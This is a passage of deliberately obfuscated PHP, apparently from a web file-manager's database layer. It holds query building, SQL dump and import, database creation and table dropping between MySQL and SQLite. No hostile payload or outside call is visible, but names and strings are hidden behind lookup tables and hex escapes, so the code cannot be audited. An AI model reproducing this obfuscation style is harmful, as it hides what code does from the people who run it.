$this->parseLock(isset($¹ƒ¨ŸÖ[$”£†¨ñÆ[833]]) ? $¹ƒ¨ŸÖ[$”£†¨ñÆ[833]] : !1) . $this->parseComment(!empty($¹ƒ¨ŸÖ[$”£†¨ñÆ[358]]) ? $¹ƒ¨ŸÖ[$”£†¨ñÆ[358]] : $”£†¨ñÆ[12]); return $this->execute($†å™¥Ô, $this->parseBind(!empty($¹ƒ¨ŸÖ[$”£†¨ñÆ[289]]) ? $¹ƒ¨ŸÖ[$”£†¨ñÆ[289]] : array())); } public function delete($ù÷Ğ = array()) { $¤ÒÉ´‡ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->model = $ù÷Ğ[$¤ÒÉ´‡[285]]; $ÈóÂ‚–Ô = $¤ÒÉ´‡[1028] . $this->parseTable($ù÷Ğ[$¤ÒÉ´‡[283]]) . $this->parseWhere(!empty($ù÷Ğ[$¤ÒÉ´‡[279]]) ? $ù÷Ğ[$¤ÒÉ´‡[279]] : $¤ÒÉ´‡[12]) . $this->parseOrder(!empty($ù÷Ğ[$¤ÒÉ´‡[369]]) ? $ù÷Ğ[$¤ÒÉ´‡[369]] : $¤ÒÉ´‡[12]) . $this->parseLimit(!empty($ù÷Ğ[$¤ÒÉ´‡[296]]) ? $ù÷Ğ[$¤ÒÉ´‡[296]] : $¤ÒÉ´‡[12]) . $this->parseLock(isset($ù÷Ğ[$¤ÒÉ´‡[833]]) ? $ù÷Ğ[$¤ÒÉ´‡[833]] : !1) . $this->parseComment(!empty($ù÷Ğ[$¤ÒÉ´‡[358]]) ? $ù÷Ğ[$¤ÒÉ´‡[358]] : $¤ÒÉ´‡[12]); return $this->execute($ÈóÂ‚–Ô, $this->parseBind(!empty($ù÷Ğ[$¤ÒÉ´‡[289]]) ? $ù÷Ğ[$¤ÒÉ´‡[289]] : array())); } public function select($Ã ÉöØ = array()) { $¢¯—¶ … =& $_SERVER[¥Ÿ©ÒèÌ]; $this->model = $Ã ÉöØ[$¢¯—¶ …[285]]; $¯Ãã•ÄÕ = $this->buildSelectSql($Ã ÉöØ); $Çğ³ü¸˜ = isset($Ã ÉöØ[$¢¯—¶ …[353]]) ? $Ã ÉöØ[$¢¯—¶ …[353]] : !1; if ($Çğ³ü¸˜) { $ÈûÍí¦¨ = is_string($Çğ³ü¸˜[$¢¯—¶ …[95]]) ? $Çğ³ü¸˜[$¢¯—¶ …[95]] : $¢¯—¶ …[1029] . md5($¯Ãã•ÄÕ); $É‰ÓÑÕĞ = think_cache($ÈûÍí¦¨, $¢¯—¶ …[12], $Çğ³ü¸˜); if (!1 !== $É‰ÓÑÕĞ) { return $É‰ÓÑÕĞ; } } $ÊÙæµÒà = $this->query($¯Ãã•ÄÕ, $this->parseBind(!empty($Ã ÉöØ[$¢¯—¶ …[289]]) ? $Ã ÉöØ[$¢¯—¶ …[289]] : array())); if ($Çğ³ü¸˜ && !1 !== $ÊÙæµÒà) { think_cache($ÈûÍí¦¨, $ÊÙæµÒà, $Çğ³ü¸˜); } return $ÊÙæµÒà; } public function buildSelectSql($¾‘µú®º = array()) { $…× ßÊ =& $_SERVER[¥Ÿ©ÒèÌ]; if (isset($¾‘µú®º[$…× ßÊ[357]])) { if (strpos($¾‘µú®º[$…× ßÊ[357]], $…× ßÊ[50])) { list($é›¡Ùôè, $ó½ôÃÂ) = explode($…× ßÊ[50], $¾‘µú®º[$…× ßÊ[357]]); } else { $é›¡Ùôè = $¾‘µú®º[$…× ßÊ[357]]; } $é›¡Ùôè = $é›¡Ùôè ? $é›¡Ùôè : 1; $ó½ôÃÂ = isset($ó½ôÃÂ) ? $ó½ôÃÂ : (is_numeric($¾‘µú®º[$…× ßÊ[296]]) ? $¾‘µú®º[$…× ßÊ[296]] : 20); $ïé˜šÂ = $ó½ôÃÂ * ((int) $é›¡Ùôè - 1); $¾‘µú®º[$…× ßÊ[296]] = $ïé˜šÂ . $…× ßÊ[50] . $ó½ôÃÂ; } if (think_config($…× ßÊ[1030])) { $ÔŠóºìû = $…× ßÊ[1031] . md5(serialize($¾‘µú®º)); $µ‘¥½Şƒ = think_cache($ÔŠóºìû); if ($µ‘¥½Şƒ) { return $µ‘¥½Şƒ; } } $¦‚¦¹ÃŸ = $this->parseSql($this->selectSql, $¾‘µú®º); $¦‚¦¹ÃŸ .= $this->parseLock(isset($¾‘µú®º[$…× ßÊ[833]]) ? $¾‘µú®º[$…× ßÊ[833]] : !1); if (isset($ÔŠóºìû)) { think_cache($ÔŠóºìû, $¦‚¦¹ÃŸ); } return $¦‚¦¹ÃŸ; } public function parseSql($¯¥û¡Ò©, $¢êÎ¶½ú = array()) { $Üˆªù×€ =& $_SERVER[¥Ÿ©ÒèÌ]; $¯¥û¡Ò© = str_replace(array($Üˆªù×€[1032], $Üˆªù×€[1033], $Üˆªù×€[1034], $Üˆªù×€[1035], $Üˆªù×€[1036], $Üˆªù×€[1037], $Üˆªù×€[1038], $Üˆªù×€[1039], $Üˆªù×€[1040], $Üˆªù×€[1041], $Üˆªù×€[1042]), array($this->parseTable("{$¢êÎ¶½ú[$Üˆªù×€[283]]}"), $this->parseDistinct(isset($¢êÎ¶½ú[$Üˆªù×€[1043]]) ? $¢êÎ¶½ú[$Üˆªù×€[1043]] : !1), $this->parseField(!empty($¢êÎ¶½ú[$Üˆªù×€[277]]) ? $¢êÎ¶½ú[$Üˆªù×€[277]] : $Üˆªù×€[181]), $this->parseJoin(!empty($¢êÎ¶½ú[$Üˆªù×€[286]]) ? $¢êÎ¶½ú[$Üˆªù×€[286]] : $Üˆªù×€[12]), $this->parseWhere(!empty($¢êÎ¶½ú[$Üˆªù×€[279]]) ? $¢êÎ¶½ú[$Üˆªù×€[279]] : $Üˆªù×€[12]), $this->parseGroup(!empty($¢êÎ¶½ú[$Üˆªù×€[515]]) ? $¢êÎ¶½ú[$Üˆªù×€[515]] : $Üˆªù×€[12]), $this->parseHaving(!empty($¢êÎ¶½ú[$Üˆªù×€[1044]]) ? $¢êÎ¶½ú[$Üˆªù×€[1044]] : $Üˆªù×€[12]), $this->parseOrder(!empty($¢êÎ¶½ú[$Üˆªù×€[369]]) ? $¢êÎ¶½ú[$Üˆªù×€[369]] : $Üˆªù×€[12]), $this->parseLimit(!empty($¢êÎ¶½ú[$Üˆªù×€[296]]) ? $¢êÎ¶½ú[$Üˆªù×€[296]] : $Üˆªù×€[12]), $this->parseUnion(!empty($¢êÎ¶½ú[$Üˆªù×€[351]]) ? $¢êÎ¶½ú[$Üˆªù×€[351]] : $Üˆªù×€[12]), $this->parseComment(!empty($¢êÎ¶½ú[$Üˆªù×€[358]]) ? $¢êÎ¶½ú[$Üˆªù×€[358]] : $Üˆªù×€[12])), $¯¥û¡Ò©); return $¯¥û¡Ò©; } public function getLastSql($œìµ€À = '') { return $œìµ€À ? $this->modelSql[$œìµ€À] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¼ÄÉÔ³Ü) { return addslashes($¼ÄÉÔ³Ü); } public function setModel($ÅòÙ°¹Í) { $this->model = $ÅòÙ°¹Í; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($©ŞçìéÖ = array()) { $ıê­¼²¿ =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($©ŞçìéÖ)) { $©ŞçìéÖ = $GLOBALS[$ıê­¼²¿[6]][$ıê­¼²¿[21]]; } $this->database = $©ŞçìéÖ; } public function model($ÅÏğıÕä = '') { return new ModelBase($ÅÏğıÕä, $_SERVER[¥Ÿ©ÒèÌ][12], $this->database); } public function db($´Ãä­èï = false) { $ÃÄ¿Õ—÷ =& $_SERVER[¥Ÿ©ÒèÌ]; $ö¹ÇúÆ = array_change_key_case($this->database); if ($this->dbType() == $ÃÄ¿Õ—÷[13] || !$´Ãä­èï) { return $this->model()->db(); } $í¿ƒ´ = $ö¹ÇúÆ[$ÃÄ¿Õ—÷[958]]; $ö¹ÇúÆ[$ÃÄ¿Õ—÷[958]] = $ÃÄ¿Õ—÷[12]; if ($ö¹ÇúÆ[$ÃÄ¿Õ—÷[953]] == $ÃÄ¿Õ—÷[950]) { $¹¡å®°× = $ö¹ÇúÆ[$ÃÄ¿Õ—÷[959]]; $ö¹ÇúÆ[$ÃÄ¿Õ—÷[959]] = substr($¹¡å®°×, 0, strrpos($¹¡å®°×, $ÃÄ¿Õ—÷[1045])); } $this->database = $ö¹ÇúÆ; $Œ€¦¸ = $this->model()->db(); try { $ø±•Ã³ú = $Œ€¦¸->execute("\x73\x68\x6f\x77\x20\x64\141\164\141\142\141\163\x65\x73\40\x6c\151\153\145\x20\47{$í¿ƒ´}\47"); } catch (Exception $û‘ò®” ) { } if (!$ø±•Ã³ú) { $Œ€¦¸->execute("\143\162\145\x61\x74\145\40\144\141\164\x61\x62\141\163\x65\x20\140{$í¿ƒ´}\x60"); } $ö¹ÇúÆ[$ÃÄ¿Õ—÷[958]] = $í¿ƒ´; if ($ö¹ÇúÆ[$ÃÄ¿Õ—÷[953]] == $ÃÄ¿Õ—÷[950]) { $ö¹ÇúÆ[$ÃÄ¿Õ—÷[959]] .= $ÃÄ¿Õ—÷[1045] . $í¿ƒ´; } $this->database = $ö¹ÇúÆ; $Œ€¦¸->execute("\x75\163\x65\x20\x60{$í¿ƒ´}\x60"); return $Œ€¦¸; } public function createTable($è¬ˆ¿®ƒ, &$çæÉ¥îü) { $Ò…üüçˆ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!IO::exist($è¬ˆ¿®ƒ)) { ActionCall($Ò…üüçˆ[1046], !0, 0); show_json(LNG($Ò…üüçˆ[1047]), !1); } $Á”ùáì = $this->model()->db(); $µ»ÏÏ´İ = sqlSplit(IO::getContent($è¬ˆ¿®ƒ)); foreach ($µ»ÏÏ´İ as $Èƒ¡Ã˜í) { $óŸà±÷™ = stripos($Èƒ¡Ã˜í, $Ò…üüçˆ[1048]) === 0; if ($óŸà±÷™) { $çæÉ¥îü->task[$Ò…üüçˆ[776]] += 1; } $Á”ùáì->execute($Èƒ¡Ã˜í); if ($óŸà±÷™) { preg_match($Ò…üüçˆ[1049], $Èƒ¡Ã˜í, $™œˆÉ); $çæÉ¥îü->task[$Ò…üüçˆ[1050]] = $™œˆÉ[1]; $çæÉ¥îü->update(1); } } } public function insertTable($¬Ô¼ŸÑ, &$‚”¯íÊè) { $Ò¹éî…Ì =& $_SERVER[¥Ÿ©ÒèÌ]; $À‹Ÿˆ´´ = $this->model()->db(); $„£ÍÑà× = $‡í¯êªç ? array($‡í¯êªç) : $À‹Ÿˆ´´->getTables(); foreach ($¬Ô¼ŸÑ as $Íìå§õ°) { $‡í¯êªç = basename($Íìå§õ°, $Ò¹éî…Ì[778]); if (!in_array($‡í¯êªç, $„£ÍÑà×)) { continue; } $‚”¯íÊè->task[$Ò¹éî…Ì[1050]] = $‡í¯êªç; if (get_filesize($Íìå§õ°) == 0) { continue; } $¤ ’Îìµ = $this->sqlToDb($Íìå§õ°, $‚”¯íÊè); if (!$¤ ’Îìµ) { ActionCall($Ò¹éî…Ì[1046], !0, 0); show_json(LNG($Ò¹éî…Ì[1051]) . "\133{$‡í¯êªç}\x5d", !1); } } } public function sqlFromDb($ğÁÊç¡, $­Ñˆ‘´„, &$ë é‹, $”Üèºš = '') { if ($ë é‹) { $ë é‹->task[$_SERVER[¥Ÿ©ÒèÌ][1050]] = $ğÁÊç¡; } $ÀäÕÁı´ = $this->model($ğÁÊç¡); $Ìç‰êØÌ = 0; $¯™é€âï = 0; $æÔ¿şı¢ = 10000; $âíñÓ²‰ = fopen($­Ñˆ‘´„, $_SERVER[¥Ÿ©ÒèÌ][1052]); $§âÉ‚‹Š = $ÀäÕÁı´->getPk(); $·¸øû¬® = $ÀäÕÁı´->getDbFields(); $Î’Âš‹ì = $_SERVER[¥Ÿ©ÒèÌ][12]; if ($GLOBALS[$_SERVER[¥Ÿ©ÒèÌ][777]] && in_array($ğÁÊç¡, array($_SERVER[¥Ÿ©ÒèÌ][1053], $_SERVER[¥Ÿ©ÒèÌ][1054]))) { $Î’Âš‹ì = $ğÁÊç¡; } do { $Ìé’äÅ = array($§âÉ‚‹Š => array($_SERVER[¥Ÿ©ÒèÌ][1000], $¯™é€âï)); $É¹ŒÛãë = $ÀäÕÁı´->where($Ìé’äÅ)->field($·¸øû¬®)->order($§âÉ‚‹Š . $_SERVER[¥Ÿ©ÒèÌ][1055])->limit($æÔ¿şı¢)->select(); $É¹ŒÛãë = !empty($É¹ŒÛãë) ? $É¹ŒÛãë : array(); if (!($ï°ÂŞÒ„ = count($É¹ŒÛãë))) { break; } $‹ÍƒÚ¦ = end($É¹ŒÛãë); $¯™é€âï = $‹ÍƒÚ¦[$§âÉ‚‹Š]; $–ß¿û– = array(); foreach ($É¹ŒÛãë as $¸äŠ£) { if ($Î’Âš‹ì) { if ($ğÁÊç¡ == $_SERVER[¥Ÿ©ÒèÌ][1053]) { if ($¸äŠ£[$_SERVER[¥Ÿ©ÒèÌ][33]] == $_SERVER[¥Ÿ©ÒèÌ][1056]) { $Ş‡®¼Õ = json_decode($¸äŠ£[$_SERVER[¥Ÿ©ÒèÌ][378]], !0); if ($Ş‡®¼Õ[$_SERVER[¥Ÿ©ÒèÌ][32]] == $GLOBALS[$_SERVER[¥Ÿ©ÒèÌ][777]] && $Ş‡®¼Õ[$_SERVER[¥Ÿ©ÒèÌ][740]] != 1) { continue; } } } else { if ($¸äŠ£[$_SERVER[¥Ÿ©ÒèÌ][33]] == $_SERVER[¥Ÿ©ÒèÌ][1057] && $¸äŠ£[$_SERVER[¥Ÿ©ÒèÌ][95]] == $_SERVER[¥Ÿ©ÒèÌ][769]) { continue; } } } if ($”Üèºš) { $¸äŠ£[$_SERVER[¥Ÿ©ÒèÌ][78]] = "\x7b\x69\x6f\72{$”Üèºš}\x7d" . substr($¸äŠ£[$_SERVER[¥Ÿ©ÒèÌ][78]], strlen("\x7b\151\x6f\x3a{$¸äŠ£[$_SERVER[¥Ÿ©ÒèÌ][807]]}\175")); $¸äŠ£[$_SERVER[¥Ÿ©ÒèÌ][807]] = $”Üèºš; } $–ß¿û–[] = $_SERVER[¥Ÿ©ÒèÌ][1058] . $this->sqlEncode($¸äŠ£) . $_SERVER[¥Ÿ©ÒèÌ][1059]; } $˜úî¶ç¯ = "\x49\116\x53\x45\122\124\x20\x49\116\x54\x4f\x20\140{$ğÁÊç¡}\x60\x20\50\140" . implode($_SERVER[¥Ÿ©ÒèÌ][1060], $·¸øû¬®) . $_SERVER[¥Ÿ©ÒèÌ][1061]; fwrite($âíñÓ²‰, $˜úî¶ç¯ . implode($_SERVER[¥Ÿ©ÒèÌ][1062], $–ß¿û–) . $_SERVER[¥Ÿ©ÒèÌ][71] . PHP_EOL); $Ìç‰êØÌ += $ï°ÂŞÒ„; if ($ë é‹) { $ë é‹->update($ï°ÂŞÒ„); } } while ($æÔ¿şı¢ == $ï°ÂŞÒ„); fclose($âíñÓ²‰); return $Ìç‰êØÌ; } public function sqlToDb($Ä¾åÃ°ï, &$°å¼Ù†) { $ÁÍ‹ÓûÑ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ã´¼†÷½ = $this->model()->db(); $Œù‘ôÈ = @fopen($Ä¾åÃ°ï, $ÁÍ‹ÓûÑ[1063]); if (!$Œù‘ôÈ) { return !1; } $ã°²Ëœí = 0; $Ã·ö‰îÔ = $ÁÍ‹ÓûÑ[12]; $¶ÌÈĞÚ = array(); $¶ò·ë‘ı = $this->dbType(); $òİ·ŒÄ = $¶ò·ë‘ı == $ÁÍ‹ÓûÑ[13] ? 500 : 2000; $¬¿ŞÙµ = basename($Ä¾åÃ°ï, $ÁÍ‹ÓûÑ[778]); $‚¦Ñ °Ú = 0; $‰­ô×Á = 4194304 - 104858; $İŠ¥ˆ¯¨ = 1000000 - 104858; while (!feof($Œù‘ôÈ)) { $‚–£’ = trim(fgets($Œù‘ôÈ)); if (!$‚–£’) { continue; } $‰­‹¿¯ = $this->sqlDecode($‚–£’, $¶ò·ë‘ı, $¬¿ŞÙµ); if (stripos($‰­‹¿¯, $ÁÍ‹ÓûÑ[359]) === 0) { if (!$Ã·ö‰îÔ) { $Ã·ö‰îÔ = $‰­‹¿¯ . $ÁÍ‹ÓûÑ[53]; } continue; } if ($°å¼Ù†) { $°å¼Ù†->task[$ÁÍ‹ÓûÑ[776]] += 1; } $ã°²Ëœí++; $¶ÌÈĞÚ[] = rtrim(rtrim(trim($‰­‹¿¯), $ÁÍ‹ÓûÑ[50]), $ÁÍ‹ÓûÑ[71]); $’´²×²Ï = null; $Ö÷ÉÁ³û = strlen($‰­‹¿¯); $‚¦Ñ °Ú += $Ö÷ÉÁ³û; if ($‚¦Ñ °Ú >= ($òİ·ŒÄ == 500 ? $İŠ¥ˆ¯¨ : $‰­ô×Á)) { $’´²×²Ï = array_pop($¶ÌÈĞÚ); if ($ã°²Ëœí > 1) { $ã°²Ëœí--; } } if ($ã°²Ëœí >= $òİ·ŒÄ || $’´²×²Ï) { $‰­‹¿¯ = $Ã·ö‰îÔ . implode($ÁÍ‹ÓûÑ[50], $¶ÌÈĞÚ); if (!$Ã´¼†÷½->execute($‰­‹¿¯)) { return !1; } if ($°å¼Ù†) { $°å¼Ù†->update($ã°²Ëœí); } $¶ÌÈĞÚ = array(); $ã°²Ëœí = 0; $‚¦Ñ °Ú = 0; if ($’´²×²Ï) { $¶ÌÈĞÚ = array($’´²×²Ï); $ã°²Ëœí = 1; $‚¦Ñ °Ú = $Ö÷ÉÁ³û; } } } fclose($Œù‘ôÈ); if (!empty($¶ÌÈĞÚ)) { $‰­‹¿¯ = $Ã·ö‰îÔ . implode($ÁÍ‹ÓûÑ[50], $¶ÌÈĞÚ); if (!$Ã´¼†÷½->execute($‰­‹¿¯)) { return !1; } if ($°å¼Ù†) { $°å¼Ù†->update($ã°²Ëœí); } } return !0; } public function dropTable($õÍşğ = null) { $ï¬ıİ£é = $this->model()->db(); $ù‰üÂ¤ù = $õÍşğ ? array($õÍşğ) : $ï¬ıİ£é->getTables(); if (!$ù‰üÂ¤ù) { return; } foreach ($ù‰üÂ¤ù as $õÍşğ) { if ($õÍşğ) { $õÍşğ = strtolower($õÍşğ); } else { continue; } $ï¬ıİ£é->execute("\x64\x72\x6f\160\40\x74\x61\142\154\145\x20\x69\146\40\145\170\x69\x73\x74\163\40\x60{$õÍşğ}\140"); } } private function sqlEncode($ĞØò–‘ñ) { $À³«ƒ¢ =& $_SERVER[¥Ÿ©ÒèÌ]; $¼øÛ”Ü = array(); foreach ($ĞØò–‘ñ as $È™ÛŸ­¢) { if (is_array($È™ÛŸ­¢)) { $È™ÛŸ­¢ = json_encode_force($È™ÛŸ­¢); } $È™ÛŸ­¢ = addslashes($È™ÛŸ­¢); $È™ÛŸ­¢ = str_replace(array($À³«ƒ¢[1064], $À³«ƒ¢[226]), array($À³«ƒ¢[1065], $À³«ƒ¢[1066]), $È™ÛŸ­¢); $¼øÛ”Ü[] = str_replace($À³«ƒ¢[58], $À³«ƒ¢[1067], $È™ÛŸ­¢); } return $À³«ƒ¢[58] . implode($À³«ƒ¢[1068], $¼øÛ”Ü) . $À³«ƒ¢[58]; } private function sqlDecode($öÛ¿¦–·, $ÇåŞÏÃ©, $˜‡æè™µ = '') { $Ò–Ôñ…Ç =& $_SERVER[¥Ÿ©ÒèÌ]; $öÛ¿¦–· = str_replace(array($Ò–Ôñ…Ç[1065], $Ò–Ôñ…Ç[1066]), array($Ò–Ôñ…Ç[1064], $Ò–Ôñ…Ç[226]), $öÛ¿¦–·); if ($ÇåŞÏÃ© == $Ò–Ôñ…Ç[13]) { return $˜‡æè™µ != $Ò–Ôñ…Ç[1069] ? stripslashes($öÛ¿¦–·) : $öÛ¿¦–·; } if ($˜‡æè™µ == $Ò–Ôñ…Ç[1069]) { $öÛ¿¦–· = str_replace($Ò–Ôñ…Ç[1070], $Ò–Ôñ…Ç[117], stripslashes($öÛ¿¦–·)); } return $öÛ¿¦–·; } public function getSqlFile($šà³–” = '') { $ÂíÅ‘Ôš =& $_SERVER[¥Ÿ©ÒèÌ]; $ªàóã¦ = $this->dbType(!0); $ÁÒë£ = CONTROLLER_DIR . "\x69\x6e\163\164\141\154\x6c\57\144\x61\x74\x61\x2f{$ªàóã¦}\x2e\163\161\x6c"; $‘¬™Ëªé = file_get_contents($ÁÒë£); $—ÂÍÛ† = $ÂíÅ‘Ôš[1071] . ($ªàóã¦ == $ÂíÅ‘Ôš[794] ? $ÂíÅ‘Ôš[1072] : $ÂíÅ‘Ôš[1073]) . $ÂíÅ‘Ôš[1074]; preg_match_all($—ÂÍÛ†, $‘¬™Ëªé, $§©ë§‹ß); $œ¦´Ÿ§ = $§©ë§‹ß[1]; $°‹œ°¼ã = $this->model()->db(); $×­­’“„ = $°‹œ°¼ã->getTables(); $Æòò­¸º = TEMP_FILES . $ÂíÅ‘Ôš[1075] . date($ÂíÅ‘Ôš[741]) . $ÂíÅ‘Ôš[8]; del_dir($Æòò­¸º); mk_dir($Æòò­¸º); $Ëƒ°áé¡ = $Æòò­¸º . $ÂíÅ‘Ôš[1076]; $»º±¾Éä = $Æòò­¸º . $ÂíÅ‘Ôš[1077]; $¹ıÀ²ÇÜ = $ªàóã¦ == $ÂíÅ‘Ôš[13] ? $ÂíÅ‘Ôš[794] : $ÂíÅ‘Ôš[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\x73\164\141\x6c\x6c\x2f\144\x61\x74\141\57{$¹ıÀ²ÇÜ}\56\163\161\154", $Æòò­¸º); @touch($Æòò­¸º . $ªàóã¦ . $ÂíÅ‘Ôš[778]); $ÒùÕ¾ÊÏ = fopen($Ëƒ°áé¡, $ÂíÅ‘Ôš[1052]); $¿í€ëã© = fopen($»º±¾Éä, $ÂíÅ‘Ôš[1052]); if ($ªàóã¦ == $ÂíÅ‘Ôš[13]) { $×­­’“„ = array_diff($×­­’“„, array($ÂíÅ‘Ôš[774], $ÂíÅ‘Ôš[775])); $ƒóÅî˜œ = array($ÂíÅ‘Ôš[1078], $ÂíÅ‘Ôš[1079], $ÂíÅ‘Ôš[1080]); fwrite($¿í€ëã©, implode(PHP_EOL, $ƒóÅî˜œ) . PHP_EOL . PHP_EOL); foreach ($×­­’“„ as $¤ìãøÌµ) { $‰Ó¡šˆ¶ = $this->sqlFromSqlite($¤ìãøÌµ); if (!$‰Ó¡šˆ¶[$ÂíÅ‘Ôš[13]]) { continue; } fwrite($¿í€ëã©, $‰Ó¡šˆ¶[$ÂíÅ‘Ôš[13]] . PHP_EOL . PHP_EOL); if (!in_array($¤ìãøÌµ, $œ¦´Ÿ§)) { fwrite($ÒùÕ¾ÊÏ, $‰Ó¡šˆ¶[$ÂíÅ‘Ôš[794]] . PHP_EOL . PHP_EOL); } } } else { foreach ($×­­’“„ as $¤ìãøÌµ) { $‰Ó¡šˆ¶ = $this->sqlFromMysql($¤ìãøÌµ); if (!$‰Ó¡šˆ¶[$ÂíÅ‘Ôš[794]]) { continue; } fwrite($ÒùÕ¾ÊÏ, $‰Ó¡šˆ¶[$ÂíÅ‘Ôš[794]] . PHP_EOL . PHP_EOL); if (!in_array($¤ìãøÌµ, $œ¦´Ÿ§)) { fwrite($¿í€ëã©, $‰Ó¡šˆ¶[$ÂíÅ‘Ôš[13]] . PHP_EOL . PHP_EOL); } } } fclose($ÒùÕ¾ÊÏ); fclose($¿í€ëã©); $‘¬™Ëªé = array($ÂíÅ‘Ôš[794] => $Ëƒ°áé¡, $ÂíÅ‘Ôš[13] => $»º±¾Éä); return $šà³–” ? $‘¬™Ëªé[$šà³–”] : $‘¬™Ëªé; } public function dbType($·´´€©Ô = false) { $·®¬ú— =& $_SERVER[¥Ÿ©ÒèÌ]; $ëœö¤ÉÑ = $·´´€©Ô ? $GLOBALS[$·®¬ú—[6]][$·®¬ú—[21]] : $this->database; $ëœö¤ÉÑ = array_change_key_case($ëœö¤ÉÑ); $õõô–Ì„ = $ëœö¤ÉÑ[$·®¬ú—[953]]; if ($õõô–Ì„ == $·®¬ú—[950]) { $¼¬Õ¡£› = explode($·®¬ú—[4], $ëœö¤ÉÑ[$·®¬ú—[959]]); $õõô–Ì„ = $¼¬Õ¡£›[0]; } $ç·ßîÃ = array($·®¬ú—[1081] => $·®¬ú—[13], $·®¬ú—[898] => $·®¬ú—[794]); if (isset($ç·ßîÃ[$õõô–Ì„])) { $õõô–Ì„ = $ç·ßîÃ[$õõô–Ì„]; } return $õõô–Ì„; } public function sqlFromMysql($Ö³™ÙÕ–, $éïŠà÷¹ = '') { $¤µö«İë =& $_SERVER[¥Ÿ©ÒèÌ]; $ÇÎİ«½ = $this->model()->db(); $õï©ŸÆ = $ÇÎİ«½->query($¤µö«İë[1082] . $Ö³™ÙÕ– . $¤µö«İë[389]); if (!$õï©ŸÆ || !$õï©ŸÆ[0]) { return !1; } $Šúï¥Ñë = _get($õï©ŸÆ[0], $¤µö«İë[1083], $¤µö«İë[12]); if (!$Šúï¥Ñë) { return !1; } $œİä”ÍÄ = "\x44\x52\x4f\x50\40\124\x41\102\x4c\x45\x20\111\106\40\x45\x58\111\123\x54\123\40\x60{$Ö³™ÙÕ–}\140\73" . PHP_EOL . $Šúï¥Ñë . $¤µö«İë[71]; if ($éïŠà÷¹ && $éïŠà÷¹ == $¤µö«İë[794]) { return $œİä”ÍÄ; } $ §»ÜÕš = array_change_key_case($GLOBALS[$¤µö«İë[6]][$¤µö«İë[21]]); $¨Ù±©¤– = $ §»ÜÕš[$¤µö«İë[958]]; $æŸŞ Å = $¤µö«İë[1084] . $¨Ù±©¤– . $¤µö«İë[1085] . $Ö³™ÙÕ– . $¤µö«İë[58]; $ìÅôƒö¨ = $¤µö«İë[1086] . $Ö³™ÙÕ– . $¤µö«İë[886]; $ƒ—¬‹ØÔ = $ÇÎİ«½->query($æŸŞ Å); if (empty($ƒ—¬‹ØÔ)) { $¬üš•õ¨ = array($¤µö«İë[794] => $¤µö«İë[12], $¤µö«İë[13] => $¤µö«İë[12]); return $éïŠà÷¹ ? $¬üš•õ¨[$éïŠà÷¹] : $¬üš•õ¨; } $€µÈ¤³› = $ÇÎİ«½->query($ìÅôƒö¨); $¬­õĞ³ = $¤µö«İë[12]; $¸­€ìÒ£ = array(); foreach ($€µÈ¤³› as $Œò€’Í’) { if (!$¬­õĞ³ && $Œò€’Í’[$¤µö«İë[1087]] == $¤µö«İë[1088]) { $¬­õĞ³ = $Œò€’Í’[$¤µö«İë[1089]]; } if (isset($¸­€ìÒ£[$Œò€’Í’[$¤µö«İë[1087]]])) { $¸­€ìÒ£[$Œò€’Í’[$¤µö«İë[1087]]][$¤µö«İë[1090]][] = $Œò€’Í’[$¤µö«İë[1089]]; continue; } $¸­€ìÒ£[$Œò€’Í’[$¤µö«İë[1087]]] = array($¤µö«İë[1091] => $Œò€’Í’[$¤µö«İë[1087]], $¤µö«İë[1090] => array($Œò€’Í’[$¤µö«İë[1089]]), $¤µö«İë[1092] => $Œò€’Í’[$¤µö«İë[1093]] == $¤µö«İë[89] ? 0 : 1); } $¸»Õ¶å = array(); foreach ($¸­€ìÒ£ as $Œò€’Í’) { $˜Ø«ÚÚ» = $Œò€’Í’[$¤µö«İë[1091]] == $¤µö«İë[1088]; $ÏàŸäÑ = array($¤µö«İë[1094], $Œò€’Í’[$¤µö«İë[1092]] == $¤µö«İë[89] && !$˜Ø«ÚÚ» ? $¤µö«İë[1095] : $¤µö«İë[12], $¤µö«İë[1096], $¤µö«İë[1097] . $Ö³™ÙÕ– . $¤µö«İë[11] . ($˜Ø«ÚÚ» ? $¤µö«İë[1098] : $Œò€’Í’[$¤µö«İë[1091]]) . $¤µö«İë[117], $¤µö«İë[1099], $¤µö«İë[117] . $Ö³™ÙÕ– . $¤µö«İë[117], $¤µö«İë[1100] . implode($¤µö«İë[1101], $Œò€’Í’[$¤µö«İë[1090]]) . $¤µö«İë[1102]); $¸»Õ¶å[] = implode($¤µö«İë[53], $ÏàŸäÑ) . $¤µö«İë[71]; } $‡çÍã‹ = array(); $ˆÅø›¶ = array($¤µö«İë[1103] => $¤µö«İë[1104], $¤µö«İë[1104] => $¤µö«İë[1104], $¤µö«İë[292] => $¤µö«İë[319], $¤µö«İë[291] => $¤µö«İë[319]); foreach ($ƒ—¬‹ØÔ as $Œò€’Í’) { $ÏàŸäÑ = array($¤µö«İë[117] . $Œò€’Í’[$¤µö«İë[1105]] . $¤µö«İë[117], isset($ˆÅø›¶[$Œò€’Í’[$¤µö«İë[1106]]]) ? $ˆÅø›¶[$Œò€’Í’[$¤µö«İë[1106]]] : $Œò€’Í’[$¤µö«İë[1107]], $Œò€’Í’[$¤µö«İë[1108]] == $¤µö«İë[884] ? $¤µö«İë[1109] : $¤µö«İë[1110], $Œò€’Í’[$¤µö«İë[1105]] == $¬­õĞ³ ? $¤µö«İë[1111] : $¤µö«İë[12], $Œò€’Í’[$¤µö«İë[935]] ? strtoupper(str_replace($¤µö«İë[11], $¤µö«İë[12], $Œò€’Í’[$¤µö«İë[935]])) : $¤µö«İë[12]); $‡çÍã‹[] = trim(implode($¤µö«İë[53], $ÏàŸäÑ)); } $İ…·ˆ¥Ş = array($¤µö«İë[1112] . $Ö³™ÙÕ– . $¤µö«İë[1113], $¤µö«İë[1114] . $Ö³™ÙÕ– . $¤µö«İë[1115], implode($¤µö«İë[50] . PHP_EOL, $‡çÍã‹), $¤µö«İë[932]); $‰À¨ñ´î = implode(PHP_EOL, array_merge($İ…·ˆ¥Ş, $¸»Õ¶å)); if ($éïŠà÷¹ && $éïŠà÷¹ == $¤µö«İë[13]) { return $‰À¨ñ´î; } $¬üš•õ¨ = array($¤µö«İë[794] => 